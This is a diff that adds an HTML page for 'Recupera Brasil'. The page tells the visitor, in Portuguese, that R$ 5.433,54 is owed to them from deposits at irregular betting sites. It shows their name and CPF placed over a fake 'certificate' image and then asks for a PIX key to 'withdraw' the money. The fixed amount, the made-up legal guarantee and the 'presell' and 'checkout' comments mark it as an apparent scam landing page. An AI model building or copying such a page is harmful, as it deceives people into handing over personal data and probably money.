@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Resultado - Recupera Brasil</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* Presell Layout Overrides */
+    body { background-color: #e2e8f0; background-image: none; padding: 20px 12px; margin: 0; min-height: 100vh; box-sizing: border-box; }
+    .main-wrapper { 
+      background: #ffffff; 
+      min-height: calc(100vh - 40px);
+      max-width: 480px; 
+      margin: 0 auto; 
+      padding: 30px 24px; 
+      box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+      border-radius: 20px;
+      border: 1px solid #e2e8f0;
+    }
+    .header { margin-bottom: 25px; }
+    
+    .greeting {
+      font-size: 22px;
+      font-weight: 800;
+      color: #0f172a;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .greeting span {
+      color: #1155cc;
+    }
+
+    .value-box {
+      background: #1155cc;
+      color: #ffffff;
+      border-radius: 16px;
+      padding: 6px 24px; /* Padding vertical bem reduzido */
+      text-align: center;
+      margin-bottom: 25px;
+      box-shadow: 0 8px 24px rgba(17, 85, 204, 0.25);
+    }
+    .value-box p {
+      font-size: 14px;
+      font-weight: 500;
+      margin-top: 4px;
+      margin-bottom: 2px;
+      opacity: 0.9;
+    }
+    .value-box h2 {
+      font-size: 32px;
+      font-weight: 800;
+      margin: 0;
+      letter-spacing: -0.5px;
+    }
+
+    .info-text {
+      color: #475569;
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 30px;
+      font-weight: 500;
+    }
+
+    .submit-btn {
+      border-radius: 30px !important;
+      background: #10b981 !important; /* Green button for checkout */
+      box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4) !important;
+      width: 100%;
+      padding: 16px 20px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-transform: uppercase;
+    }
+
+    .submit-btn:disabled {
+      background: #e2e8f0 !important;
+      color: #94a3b8 !important;
+      box-shadow: none !important;
+      cursor: not-allowed !important;
+    }
+
+    /* Modal Adjustments */
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    /* Certificado com sobreposição de texto */
+    .doc-wrapper {
+      position: relative;
+      width: 100%;
+      margin: 20px 0;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .doc-img {
+      width: 100%;
+      display: block;
+    }
+    /* ========================================================
+       ⚠️ ZONA PROTEGIDA - POSICIONAMENTO DO CERTIFICADO ⚠️
+       NÃO ALTERAR NENHUM VALOR DE TOP, LEFT, WIDTH OU FONT-SIZE ABAIXO.
+       POSIÇÕES CALIBRADAS EXATAMENTE COM A IMAGEM.
+       ======================================================== */
+    /* Nome sobre o campo NOME COMPLETO da imagem */
+    .doc-nome {
+      position: absolute !important;
+      top: 34.2% !important;
+      left: 1.5% !important; 
+      width: 82% !important;
+      text-align: center !important;
+      font-size: clamp(7.5px, 2.3vw, 11px) !important;
+      font-weight: 700 !important;
+      color: #1a1a1a !important;
+      letter-spacing: 0.3px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    /* CPF sobre o campo CPF da imagem */
+    .doc-cpf {
+      position: absolute !important;
+      top: 44.2% !important;
+      left: 12% !important; 
+      width: 34% !important;
+      text-align: center !important;
+      font-size: clamp(7.5px, 2.3vw, 11px) !important;
+      font-weight: 700 !important;
+      color: #1a1a1a !important;
+      letter-spacing: 0.5px;
+    }
+    /* ======================================================== */
+  
+    /* Bottom Sheet Modal Styles */
+    .modal-overlay {
+      align-items: flex-end !important; /* Align to bottom */
+      padding: 0 !important;
+    }
+    .modal-card {
+      width: 100% !important;
+      max-width: 480px !important; /* Limit width on desktop */
+      border-radius: 24px 24px 0 0 !important;
+      margin: 0 auto !important;
+      padding: 20px 16px 20px 16px !important; /* Less padding to reduce height */
+      transform: translateY(100%) !important;
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1) !important;
+    }
+    .modal-overlay.active .modal-card {
+      transform: translateY(0) !important;
+    }
+    .modal-card p, .modal-card span, .modal-card label, .modal-card input, .modal-card select {
+      font-size: 13px !important; /* Reduce font size */
+    }
+    .modal-card .submit-btn {
+      font-size: 14px !important;
+      padding: 14px !important;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="main-wrapper">
+    
+    <!-- Top Header (Nova Logo) -->
+    <header class="header">
+      <div class="brand-logo-container" style="width: 100%; max-width: 250px; margin: 0 auto; padding: 0;">
+        <img src="logorecuperabrasil/recupera.png" onerror="this.onerror=null; this.src='assets/recupera.png'; if(!this.complete) this.src='recupera.png';" alt="Direito de Receber de Volta" class="recupera-logo" style="width: 100%; border-radius: 0; box-shadow: none; filter: none; mix-blend-mode: normal;" />
+      </div>
+    </header>
+
+    <main class="card-container" style="border: none; box-shadow: none; padding: 0; background: transparent;">
+      
+      <div id="resultContent">
+        <h1 class="greeting">Olá, <span id="userName">...</span></h1>
+
+        <div class="value-box">
+          <p>Você tem um valor de</p>
+          <h2>R$ 5.433,54</h2>
+          <p style="margin-top: 5px; font-size: 13px; opacity: 0.8;">a receber.</p>
+        </div>
+
+        <div class="info-text">
+          Estes valores foram identificados através do cruzamento de dados com seu CPF e histórico de depósitos em casas de apostas irregulares no Brasil, garantidos por lei. 
+          <br><br>
+          Segue abaixo seu certificado de comprovância com seus valores a receber.
+        </div>
+
+        <!-- Certificado com Nome e CPF sobrepostos -->
+        <div class="doc-wrapper">
+          <img src="documentologo/documento.jpeg" onerror="this.onerror=null; this.src='assets/documento.jpeg'; if(!this.complete) this.src='documento.jpeg';" alt="Certificado de Registro" class="doc-img" />
+          <span class="doc-nome" id="docNome"></span>
+          <span class="doc-cpf" id="docCpf"></span>
+        </div>
+
+        <div class="info-text" style="margin-top: 20px;">
+          Clique no botão abaixo para iniciar a transferência via PIX para sua conta vinculada a este CPF.
+        </div>
+
+        <button class="submit-btn" id="sacarBtn">
+          SACAR AGORA
+        </button>
+
+      </div>
+    </main>
+  </div>
+
+  <!-- Checkout / PIX Modal (Migrado da Página 1) -->
+  <div class="modal-overlay" id="resultModal">
+    <div class="modal-card">
+      <button class="modal-close-btn" id="closeModalBtn">&times;</button>
+      
+      <div class="modal-brand-header">
+        <img src="logorecuperabrasil/recupera.png" onerror="this.onerror=null; this.src='assets/recupera.png'; if(!this.complete) this.src='recupera.png';" alt="Recupera Brasil" class="modal-brand-logo" style="filter: none; mix-blend-mode: normal; width: 140px; box-shadow: none; border-radius: 0; background: transparent;" />
+      </div>
+
+      <!-- Step: Selecionar Chave PIX -->
+      <div class="modal-step" id="stepPixKey">
+        <h3 class="modal-title" style="margin-top: 10px; font-size: 18px;">Dados do Recebedor</h3>
+        
+        <div class="result-info-box" style="margin-bottom: 15px; padding: 12px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px;">
+          <div class="result-row" style="margin-bottom: 8px;">
+            <span class="row-label" style="font-size: 12px; color: #64748b;">Nome Completo:</span>
+            <strong class="row-val" id="verifyName" style="font-size: 14px; color: #0f172a;">---</strong>
+          </div>
+          <div class="result-row">
+            <span class="row-label" style="font-size: 12px; color: #64748b;">CPF:</span>
+            <strong class="row-val" id="verifyCpf" style="font-size: 14px; color: #0f172a;">---</strong>
+          </div>
+        </div>
+
+        <p class="modal-status-text" style="font-size: 13px; color: #475569; margin-bottom: 15px; text-align: center; font-weight: 500;">
+          A transferência será enviada para este titular da chave PIX selecionada abaixo.
+        </p>
+
+        <div class="pix-key-selector" style="margin-bottom: 15px;">
+          <label style="display: block; font-size: 13px; font-weight: 700; color: #1e293b; margin-bottom: 8px;">Tipo de Chave PIX:</label>
+          <select id="pixKeyType" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #cbd5e1; background: #ffffff; font-size: 14px; font-weight: 500; color: #0f172a; outline: none; margin-bottom: 12px;">
+            <option value="cpf">CPF</option>
+            <option value="celular">Celular</option>
+            <option value="email">E-mail</option>
+            <option value="aleatoria">Chave Aleatória</option>
+          </select>
+
+          <label style="display: block; font-size: 13px; font-weight: 700; color: #1e293b; margin-bottom: 8px;">Sua Chave PIX:</label>
+          <input type="text" id="pixKeyValue" placeholder="Digite sua chave PIX aqui..." style="width: 100%; padding: 10px; border-radius: 10px; border: 1px solid #cbd5e1; background: #ffffff; font-size: 13px; font-weight: 500; color: #0f172a; outline: none;" />
+          <p id="pixErrorMsg" style="color: #ef4444; font-size: 12px; font-weight: 500; margin-top: 5px; display: none;"></p>
+        </div>
+
+        <button class="submit-btn" id="verifyPayBtn" style="border-radius: 30px; font-size: 15px;" disabled>
+          CONTINUAR PARA O RECEBIMENTO
+        </button>
+      </div>
+    </div>
+  </div>
+  
+  <script src="resultado.js"></script>
+</body>
+</html>
